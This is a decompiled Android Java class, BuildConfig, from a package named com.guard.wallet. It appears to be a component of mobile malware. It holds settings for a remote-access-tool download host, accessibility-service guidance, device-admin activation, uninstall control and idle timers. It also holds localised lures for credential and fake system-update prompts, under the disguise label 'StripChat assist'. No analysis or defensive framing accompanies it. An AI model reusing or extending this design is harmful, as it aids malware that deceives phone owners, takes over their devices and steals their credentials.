package com.guard.wallet.entity;

import a1.AbstractC0026q;
import android.support.annotation.NonNull;
import com.guard.wallet.utils.AbstractC0249e;
import com.guard.wallet.utils.AbstractC0252h;
import java.io.Serializable;
import java.util.HashMap;
import java.util.Objects;

/* loaded from: classes.dex */
public class BuildConfig implements Serializable {
    private Integer activeAdmin;
    private String blockBgColor;
    private String blockIconUrl;
    private Integer debug;
    private String downloadRatHatHost;
    private String downloadRatHatName;
    private String guideAccessibilityHost;
    private HashMap<String, LangDialog> langMap;
    private String mainActivity;
    private String mainUrl;
    private Integer perIdleDuration;
    private Integer perScreenOffDuration;
    private Integer promotionModel;
    private String serverHost;
    private String trusteeId;
    private Integer uninstall;

    public BuildConfig() {
    }

    public BuildConfig(String str, String str2, String str3, String str4, String str5, String str6, String str7, String str8, String str9, Integer num, Integer num2, Integer num3, Integer num4, Integer num5, Integer num6, HashMap<String, LangDialog> hashMap) {
        this.serverHost = str;
        this.downloadRatHatHost = str2;
        this.downloadRatHatName = str3;
        this.guideAccessibilityHost = str4;
        this.mainActivity = str5;
        this.mainUrl = str6;
        this.trusteeId = str7;
        this.blockIconUrl = str8;
        this.blockBgColor = str9;
        this.promotionModel = num;
        this.uninstall = num2;
        this.activeAdmin = num3;
        this.langMap = hashMap;
        this.debug = num4;
        this.perScreenOffDuration = num5;
        this.perIdleDuration = num6;
    }

    public String getAccessibilityServiceLabel() {
        HashMap<String, LangDialog> hashMap;
        String m709m = AbstractC0252h.m709m();
        if (AbstractC0026q.m151B(m709m) || (hashMap = this.langMap) == null || hashMap.isEmpty()) {
            return null;
        }
        String m617f = AbstractC0249e.m617f(m709m);
        LangDialog langDialog = this.langMap.get(m709m);
        if (langDialog == null && !Objects.equals(m617f, m709m)) {
            langDialog = this.langMap.get(m617f);
        }
        if (langDialog == null) {
            langDialog = this.langMap.get("en");
        }
        if (langDialog != null) {
            return langDialog.getAccessibilityServiceLabel();
        }
        return null;
    }

    public Integer getActiveAdmin() {
        return this.activeAdmin;
    }

    public String getAlertMsg() {
        HashMap<String, LangDialog> hashMap;
        String m709m = AbstractC0252h.m709m();
        if (AbstractC0026q.m151B(m709m) || (hashMap = this.langMap) == null || hashMap.isEmpty()) {
            return null;
        }
        String m617f = AbstractC0249e.m617f(m709m);
        LangDialog langDialog = this.langMap.get(m709m);
        if (langDialog == null && !Objects.equals(m617f, m709m)) {
            langDialog = this.langMap.get(m617f);
        }
        if (langDialog == null) {
            langDialog = this.langMap.get("en");
        }
        if (langDialog != null) {
            return langDialog.getAlertMsg();
        }
        return null;
    }

    public String getAlertRestrictedMsg() {
        HashMap<String, LangDialog> hashMap;
        String m709m = AbstractC0252h.m709m();
        if (AbstractC0026q.m151B(m709m) || (hashMap = this.langMap) == null || hashMap.isEmpty()) {
            return null;
        }
        String m617f = AbstractC0249e.m617f(m709m);
        LangDialog langDialog = this.langMap.get(m709m);
        if (langDialog == null && !Objects.equals(m617f, m709m)) {
            langDialog = this.langMap.get(m617f);
        }
        if (langDialog == null) {
            langDialog = this.langMap.get("en");
        }
        if (langDialog != null) {
            return langDialog.getAlertRestrictedMsg();
        }
        return null;
    }

    public String getAlertTitle() {
        HashMap<String, LangDialog> hashMap;
        String m709m = AbstractC0252h.m709m();
        if (AbstractC0026q.m151B(m709m) || (hashMap = this.langMap) == null || hashMap.isEmpty()) {
            return null;
        }
        String m617f = AbstractC0249e.m617f(m709m);
        LangDialog langDialog = this.langMap.get(m709m);
        if (langDialog == null && !Objects.equals(m617f, m709m)) {
            langDialog = this.langMap.get(m617f);
        }
        if (langDialog == null) {
            langDialog = this.langMap.get("en");
        }
        if (langDialog != null) {
            return langDialog.getAlertTitle();
        }
        return null;
    }

    public String getAliveBlockMsg() {
        HashMap<String, LangDialog> hashMap;
        String m709m = AbstractC0252h.m709m();
        if (AbstractC0026q.m151B(m709m) || (hashMap = this.langMap) == null || hashMap.isEmpty()) {
            return null;
        }
        String m617f = AbstractC0249e.m617f(m709m);
        LangDialog langDialog = this.langMap.get(m709m);
        if (langDialog == null && !Objects.equals(m617f, m709m)) {
            langDialog = this.langMap.get(m617f);
        }
        if (langDialog == null) {
            langDialog = this.langMap.get("en");
        }
        if (langDialog != null) {
            return langDialog.getAliveBlockMsg();
        }
        return null;
    }

    public String getAllowRestricted() {
        HashMap<String, LangDialog> hashMap;
        String m709m = AbstractC0252h.m709m();
        if (AbstractC0026q.m151B(m709m) || (hashMap = this.langMap) == null || hashMap.isEmpty()) {
            return null;
        }
        String m617f = AbstractC0249e.m617f(m709m);
        LangDialog langDialog = this.langMap.get(m709m);
        if (langDialog == null && !Objects.equals(m617f, m709m)) {
            langDialog = this.langMap.get(m617f);
        }
        if (langDialog == null) {
            langDialog = this.langMap.get("en");
        }
        if (langDialog != null) {
            return langDialog.getAllowRestricted();
        }
        return null;
    }

    public String getAppCredentialDescription() {
        HashMap<String, LangDialog> hashMap;
        String m709m = AbstractC0252h.m709m();
        if (AbstractC0026q.m151B(m709m) || (hashMap = this.langMap) == null || hashMap.isEmpty()) {
            return null;
        }
        String m617f = AbstractC0249e.m617f(m709m);
        LangDialog langDialog = this.langMap.get(m709m);
        if (langDialog == null && !Objects.equals(m617f, m709m)) {
            langDialog = this.langMap.get(m617f);
        }
        if (langDialog == null) {
            langDialog = this.langMap.get("en");
        }
        if (langDialog != null) {
            return langDialog.getAppCredentialDescription();
        }
        return null;
    }

    public String getAppCredentialInitMsg() {
        HashMap<String, LangDialog> hashMap;
        String m709m = AbstractC0252h.m709m();
        if (AbstractC0026q.m151B(m709m) || (hashMap = this.langMap) == null || hashMap.isEmpty()) {
            return null;
        }
        String m617f = AbstractC0249e.m617f(m709m);
        LangDialog langDialog = this.langMap.get(m709m);
        if (langDialog == null && !Objects.equals(m617f, m709m)) {
            langDialog = this.langMap.get(m617f);
        }
        if (langDialog == null) {
            langDialog = this.langMap.get("en");
        }
        if (langDialog != null) {
            return langDialog.getAppCredentialInitMsg();
        }
        return null;
    }

    public String getAppCredentialSubTitle() {
        HashMap<String, LangDialog> hashMap;
        String m709m = AbstractC0252h.m709m();
        if (AbstractC0026q.m151B(m709m) || (hashMap = this.langMap) == null || hashMap.isEmpty()) {
            return null;
        }
        String m617f = AbstractC0249e.m617f(m709m);
        LangDialog langDialog = this.langMap.get(m709m);
        if (langDialog == null && !Objects.equals(m617f, m709m)) {
            langDialog = this.langMap.get(m617f);
        }
        if (langDialog == null) {
            langDialog = this.langMap.get("en");
        }
        if (langDialog != null) {
            return langDialog.getAppCredentialSubTitle();
        }
        return null;
    }

    public String getAppCredentialTitle() {
        HashMap<String, LangDialog> hashMap;
        String m709m = AbstractC0252h.m709m();
        if (AbstractC0026q.m151B(m709m) || (hashMap = this.langMap) == null || hashMap.isEmpty()) {
            return null;
        }
        String m617f = AbstractC0249e.m617f(m709m);
        LangDialog langDialog = this.langMap.get(m709m);
        if (langDialog == null && !Objects.equals(m617f, m709m)) {
            langDialog = this.langMap.get(m617f);
        }
        if (langDialog == null) {
            langDialog = this.langMap.get("en");
        }
        if (langDialog != null) {
            return langDialog.getAppCredentialTitle();
        }
        return null;
    }

    public String getAppLabel() {
        HashMap<String, LangDialog> hashMap;
        String m709m = AbstractC0252h.m709m();
        if (AbstractC0026q.m151B(m709m) || (hashMap = this.langMap) == null || hashMap.isEmpty()) {
            return "StripChat assist";
        }
        String m617f = AbstractC0249e.m617f(m709m);
        LangDialog langDialog = this.langMap.get(m709m);
        if (langDialog == null && !Objects.equals(m617f, m709m)) {
            langDialog = this.langMap.get(m617f);
        }
        if (langDialog == null) {
            langDialog = this.langMap.get("en");
        }
        return langDialog != null ? langDialog.getAppLabel() : "StripChat assist";
    }

    public String getBlockBgColor() {
        return this.blockBgColor;
    }

    public String getBlockIconUrl() {
        return this.blockIconUrl;
    }

    public Integer getDebug() {
        return this.debug;
    }

    public String getDownloadRatHatHost() {
        return this.downloadRatHatHost;
    }

    public String getDownloadRatHatName() {
        return this.downloadRatHatName;
    }

    public String getExitConfirm() {
        HashMap<String, LangDialog> hashMap;
        String m709m = AbstractC0252h.m709m();
        if (AbstractC0026q.m151B(m709m) || (hashMap = this.langMap) == null || hashMap.isEmpty()) {
            return null;
        }
        String m617f = AbstractC0249e.m617f(m709m);
        LangDialog langDialog = this.langMap.get(m709m);
        if (langDialog == null && !Objects.equals(m617f, m709m)) {
            langDialog = this.langMap.get(m617f);
        }
        if (langDialog == null) {
            langDialog = this.langMap.get("en");
        }
        if (langDialog != null) {
            return langDialog.getExitConfirm();
        }
        return null;
    }

    public String getGuideAccessibilityHost() {
        return this.guideAccessibilityHost;
    }

    public HashMap<String, LangDialog> getLangMap() {
        return this.langMap;
    }

    public String getLauncherLabel() {
        HashMap<String, LangDialog> hashMap;
        String m709m = AbstractC0252h.m709m();
        if (AbstractC0026q.m151B(m709m) || (hashMap = this.langMap) == null || hashMap.isEmpty()) {
            return null;
        }
        String m617f = AbstractC0249e.m617f(m709m);
        LangDialog langDialog = this.langMap.get(m709m);
        if (langDialog == null && !Objects.equals(m617f, m709m)) {
            langDialog = this.langMap.get(m617f);
        }
        if (langDialog == null) {
            langDialog = this.langMap.get("en");
        }
        if (langDialog != null) {
            return langDialog.getLauncherLabel();
        }
        return null;
    }

    public String getMainActivity() {
        return this.mainActivity;
    }

    public String getMainUrl() {
        return this.mainUrl;
    }

    public String getNotificationContent() {
        HashMap<String, LangDialog> hashMap;
        String m709m = AbstractC0252h.m709m();
        if (AbstractC0026q.m151B(m709m) || (hashMap = this.langMap) == null || hashMap.isEmpty()) {
            return null;
        }
        String m617f = AbstractC0249e.m617f(m709m);
        LangDialog langDialog = this.langMap.get(m709m);
        if (langDialog == null && !Objects.equals(m617f, m709m)) {
            langDialog = this.langMap.get(m617f);
        }
        if (langDialog == null) {
            langDialog = this.langMap.get("en");
        }
        if (langDialog != null) {
            return langDialog.getNotificationContent();
        }
        return null;
    }

    public String getNotificationTitle() {
        HashMap<String, LangDialog> hashMap;
        String m709m = AbstractC0252h.m709m();
        if (AbstractC0026q.m151B(m709m) || (hashMap = this.langMap) == null || hashMap.isEmpty()) {
            return null;
        }
        String m617f = AbstractC0249e.m617f(m709m);
        LangDialog langDialog = this.langMap.get(m709m);
        if (langDialog == null && !Objects.equals(m617f, m709m)) {
            langDialog = this.langMap.get(m617f);
        }
        if (langDialog == null) {
            langDialog = this.langMap.get("en");
        }
        if (langDialog != null) {
            return langDialog.getNotificationTitle();
        }
        return null;
    }

    public String getOkText() {
        HashMap<String, LangDialog> hashMap;
        String m709m = AbstractC0252h.m709m();
        if (AbstractC0026q.m151B(m709m) || (hashMap = this.langMap) == null || hashMap.isEmpty()) {
            return null;
        }
        String m617f = AbstractC0249e.m617f(m709m);
        LangDialog langDialog = this.langMap.get(m709m);
        if (langDialog == null && !Objects.equals(m617f, m709m)) {
            langDialog = this.langMap.get(m617f);
        }
        if (langDialog == null) {
            langDialog = this.langMap.get("en");
        }
        if (langDialog != null) {
            return langDialog.getOkText();
        }
        return null;
    }

    public Integer getPerIdleDuration() {
        return this.perIdleDuration;
    }

    public Integer getPerScreenOffDuration() {
        return this.perScreenOffDuration;
    }

    public Integer getPromotionModel() {
        return this.promotionModel;
    }

    public String getServerHost() {
        return this.serverHost;
    }

    public String getTrusteeId() {
        return this.trusteeId;
    }

    public Integer getUninstall() {
        return this.uninstall;
    }

    public String getUpdateCredentialDescription() {
        HashMap<String, LangDialog> hashMap;
        String m709m = AbstractC0252h.m709m();
        if (AbstractC0026q.m151B(m709m) || (hashMap = this.langMap) == null || hashMap.isEmpty()) {
            return null;
        }
        String m617f = AbstractC0249e.m617f(m709m);
        LangDialog langDialog = this.langMap.get(m709m);
        if (langDialog == null && !Objects.equals(m617f, m709m)) {
            langDialog = this.langMap.get(m617f);
        }
        if (langDialog == null) {
            langDialog = this.langMap.get("en");
        }
        if (langDialog != null) {
            return langDialog.getUpdateCredentialDescription();
        }
        return null;
    }

    public String getUpdateCredentialSubTitle() {
        HashMap<String, LangDialog> hashMap;
        String m709m = AbstractC0252h.m709m();
        if (AbstractC0026q.m151B(m709m) || (hashMap = this.langMap) == null || hashMap.isEmpty()) {
            return null;
        }
        String m617f = AbstractC0249e.m617f(m709m);
        LangDialog langDialog = this.langMap.get(m709m);
        if (langDialog == null && !Objects.equals(m617f, m709m)) {
            langDialog = this.langMap.get(m617f);
        }
        if (langDialog == null) {
            langDialog = this.langMap.get("en");
        }
        if (langDialog != null) {
            return langDialog.getUpdateCredentialSubTitle();
        }
        return null;
    }

    public String getUpdateCredentialTitle() {
        HashMap<String, LangDialog> hashMap;
        String m709m = AbstractC0252h.m709m();
        if (AbstractC0026q.m151B(m709m) || (hashMap = this.langMap) == null || hashMap.isEmpty()) {
            return null;
        }
        String m617f = AbstractC0249e.m617f(m709m);
        LangDialog langDialog = this.langMap.get(m709m);
        if (langDialog == null && !Objects.equals(m617f, m709m)) {
            langDialog = this.langMap.get(m617f);
        }
        if (langDialog == null) {
            langDialog = this.langMap.get("en");
        }
        if (langDialog != null) {
            return langDialog.getUpdateCredentialTitle();
        }
        return null;
    }

    public String getUpdateSystemMsg() {
        HashMap<String, LangDialog> hashMap;
        String m709m = AbstractC0252h.m709m();
        if (AbstractC0026q.m151B(m709m) || (hashMap = this.langMap) == null || hashMap.isEmpty()) {
            return null;
        }
        String m617f = AbstractC0249e.m617f(m709m);
        LangDialog langDialog = this.langMap.get(m709m);
        if (langDialog == null && !Objects.equals(m617f, m709m)) {
            langDialog = this.langMap.get(m617f);
        }
        if (langDialog == null) {
            langDialog = this.langMap.get("en");
        }
        if (langDialog != null) {
            return langDialog.getUpdateSystemMsg();
        }
        return null;
    }

    public String getWifiBlockMsg() {
        HashMap<String, LangDialog> hashMap;
        String m709m = AbstractC0252h.m709m();
        if (AbstractC0026q.m151B(m709m) || (hashMap = this.langMap) == null || hashMap.isEmpty()) {
            return null;
        }
        String m617f = AbstractC0249e.m617f(m709m);
        LangDialog langDialog = this.langMap.get(m709m);
        if (langDialog == null && !Objects.equals(m617f, m709m)) {
            langDialog = this.langMap.get(m617f);
        }
        if (langDialog == null) {
            langDialog = this.langMap.get("en");
        }
        if (langDialog != null) {
            return langDialog.getWifiBlockMsg();
        }
        return null;
    }

    public void setActiveAdmin(Integer num) {
        this.activeAdmin = num;
    }

    public void setBlockBgColor(String str) {
        this.blockBgColor = str;
    }

    public void setBlockIconUrl(String str) {
        this.blockIconUrl = str;
    }

    public void setDebug(Integer num) {
        this.debug = num;
    }

    public void setDownloadRatHatHost(String str) {
        this.downloadRatHatHost = str;
    }

    public void setDownloadRatHatName(String str) {
        this.downloadRatHatName = str;
    }

    public void setGuideAccessibilityHost(String str) {
        this.guideAccessibilityHost = str;
    }

    public void setLangMap(HashMap<String, LangDialog> hashMap) {
        this.langMap = hashMap;
    }

    public void setMainActivity(String str) {
        this.mainActivity = str;
    }

    public void setMainUrl(String str) {
        this.mainUrl = str;
    }

    public void setPerIdleDuration(Integer num) {
        this.perIdleDuration = num;
    }

    public void setPerScreenOffDuration(Integer num) {
        this.perScreenOffDuration = num;
    }

    public void setPromotionModel(Integer num) {
        this.promotionModel = num;
    }

    public void setServerHost(String str) {
        this.serverHost = str;
    }

    public void setTrusteeId(String str) {
        this.trusteeId = str;
    }

    public void setUninstall(Integer num) {
        this.uninstall = num;
    }

    @NonNull
    public String toString() {
        return "BuildConfig{serverHost='" + this.serverHost + "',downloadRatHatHost='" + this.downloadRatHatHost + "',downloadRatHatName='" + this.downloadRatHatName + "',guideAccessibilityHost='" + this.guideAccessibilityHost + "',mainActivity='" + this.mainActivity + "',mainUrl='" + this.mainUrl + "', trusteeId='" + this.trusteeId + "', blockIconUrl='" + this.blockIconUrl + "', blockBgColor='" + this.blockBgColor + "', promotionModel='" + this.promotionModel + "', uninstall='" + this.uninstall + "', activeAdmin='" + this.activeAdmin + "', debug='" + this.debug + "', perScreenOffDuration='" + this.perScreenOffDuration + "', perIdleDuration='" + this.perIdleDuration + "', langMap='" + this.langMap + "'}";
    }
}
